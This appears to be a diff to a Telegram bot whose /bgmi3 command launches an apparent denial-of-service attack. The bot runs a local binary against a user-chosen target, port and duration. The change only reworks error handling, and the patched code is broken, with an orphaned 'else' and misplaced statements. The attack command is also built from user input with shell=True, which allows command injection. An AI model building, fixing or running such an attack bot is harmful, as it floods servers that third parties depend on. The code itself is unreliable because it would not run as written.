@@ -403,8 +403,7 @@ COOLDOWN_TIME =0
 # Handler for /bgmi3 command
 @bot.message_handler(commands=['bgmi3'])
 def handle_bgmi3(message):
-    if 'message' in locals() or 'message' in globals():
-        user_id = str(message.chat.id)
+    user_id = str(message.chat.id)  # Define user_id properly
     else:
         logging.error('Error: message variable is not defined.')
         return
@@ -444,8 +443,11 @@ def handle_bgmi3(message):
                 full_command = f"./Rahul {target} {port} {time} 900"
                 process = subprocess.run(full_command, shell=True)
 
-# Remove from ongoing attacks once the attack completes
-ongoing_attacks.pop(user_id)
+# Remove user from ongoing_attacks after attack completes
+try:
+    ongoing_attacks.pop(user_id)
+except KeyError:
+    logging.warning(f"User ID {user_id} not found in ongoing_attacks")
 
 # Get attacker name
 user_info = message.from_user
